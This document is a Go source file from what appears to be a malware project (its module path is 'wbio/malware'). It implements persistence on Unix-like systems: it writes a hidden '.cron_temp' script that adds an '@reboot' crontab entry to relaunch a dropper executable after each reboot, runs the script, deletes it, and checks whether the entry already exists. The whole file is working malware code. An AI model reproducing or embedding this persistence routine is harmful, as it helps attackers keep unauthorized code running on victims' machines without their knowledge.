//go:build !windows
// +build !windows

package persistence

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	e "wbio/malware/errorinfo"
)

func AddPersistence(dropperPath string) {
	dropperPath = filepath.FromSlash(dropperPath + "/" + getExecutableName())

	if checkIfPersistent(dropperPath) {
		log.Println("[Persistence] Persistence already enabled")
		return
	}

	tempFileName := ".cron_temp"

	log.Println("[Persistence] Enabling persistence")

	command := fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot sleep 120 && %s\") | crontab -", dropperPath)
	err := os.WriteFile(tempFileName, []byte(command), 0755)
	e.Check(err, true)

	err = exec.Command("bash", tempFileName).Run()
	e.Check(err, true)

	log.Printf("[Persistence] Persistence enabled: %s\n", command)

	err = os.Remove(tempFileName)
	e.Check(err, true)
}

func checkIfPersistent(dropperPath string) bool {
	c1 := exec.Command("crontab", "-l")
	c2 := exec.Command("grep", dropperPath)

	r, w := io.Pipe()
	c1.Stdout = w
	c2.Stdin = r

	var buffer bytes.Buffer
	c2.Stdout = &buffer

	c1.Start()
	c2.Start()
	c1.Wait()
	w.Close()
	c2.Wait()

	if len(buffer.String()) > 0 {
		return true
	} else {
		return false
	}
}

func getExecutableName() string {
	exec, err := os.Executable()
	e.Check(err, true)
	return filepath.Base(exec)
}
